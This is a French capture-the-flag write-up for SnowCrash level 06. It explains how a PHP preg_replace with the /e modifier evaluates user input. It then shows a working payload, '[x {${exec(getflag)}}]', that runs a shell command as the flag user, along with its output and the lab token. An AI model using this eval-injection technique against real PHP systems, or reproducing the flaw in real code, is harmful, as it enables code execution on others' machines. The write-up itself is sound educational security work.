# Level 06

Le répertoire de ce niveau contient un fichier php:

```php
#!/usr/bin/php
<?php
function y($m) {
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m;
}

function x($y, $z) {
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a);
    $a = preg_replace("/\]/", ")", $a);
    return $a;
}

$r = x($argv[1], $argv[2]);
print $r;
?>
```

Dans ce même répertoire il y a un exécutable qui semble run ce code en avec l'user flag06.

`pgrep_replace` est une fonction de remplacement d'expression reguliere

```/(\[x (.*)\])/e```

Le `e` à la fin de cette expression correspond à la fonction `eval` et indique que le remplacement doit être traité comme du code php.

```re
(\[x (.*)\])
```
Ce pattern sert à match le pattern `[x ...]` et à extraire le `...`

```"y(\"\\2\")"```
C'est le string de remplacement, il va appeler la fonction `y` avec `\\2` qui est le 2eme groupe matché par le pattern précédent

On a donc commencé par simplement essayer de passer un string contenant getflag:

```sh
level06@SnowCrash:~$ echo "[x getflag]" >> /tmp/test
level06@SnowCrash:~$ ./level06 /tmp/test 
getflag
```
Fonctionne pas, ca affiche juste getflag


en php, on peut utiliser les backtick comme dans le level04 pour remplacer par le résultat 
```sh
level06@SnowCrash:~$ echo "[x `getflag`]" > /tmp/test
level06@SnowCrash:~$ ./level06 /tmp/test 
(x Check flag.Here is your token : 
Nope there is no token here for you sorry. Try again :))
```
Fonctionne pas non plus, ça a pas l'air de l'exécuter en tant que flag06

On peut utiliser la commande `exec` pour executer une commande shell en php (https://www.php.net/manual/en/function.exec.php), on utilise la [syntaxe de substitution de variables](https://brainbell.com/php/variable-substitution.html) et on arrive à récupérer le flag
```sh
level06@SnowCrash:~$ echo '[x {${exec(getflag)}}]' > /tmp/test
level06@SnowCrash:~$ ./level06 /tmp/test 
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1```